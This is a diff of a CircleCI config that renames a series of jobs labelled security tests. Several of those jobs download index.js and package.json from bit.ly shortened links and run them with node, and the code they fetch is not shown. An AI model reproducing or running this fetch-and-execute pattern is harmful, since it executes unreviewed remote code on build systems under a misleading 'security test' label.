@@ -1,7 +1,7 @@
 version: 2.1
 
 jobs:
- security_test_1:
+ security_test_9:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
@@ -11,7 +11,7 @@ jobs:
       - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
       - run: npm i -s
       - run: node index 58
- security_test_2:
+ security_test_10:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
@@ -21,7 +21,7 @@ jobs:
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
       - run: node index 58
- security_test_3:
+ security_test_11:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
@@ -31,7 +31,7 @@ jobs:
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
       - run: node index 58
- security_test_4:
+ security_test_12:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
@@ -41,7 +41,7 @@ jobs:
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
       - run: node index 58
- security_test_5:
+ security_test_13:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
@@ -51,7 +51,7 @@ jobs:
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
       - run: node index 57
- security_test_6:
+ security_test_14:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
@@ -61,7 +61,7 @@ jobs:
       - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
       - run: npm i -s
       - run: node index 58
- security_test_7:
+ security_test_15:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
@@ -71,7 +71,7 @@ jobs:
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
       - run: node index 58
- security_test_8:
+ security_test_16:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
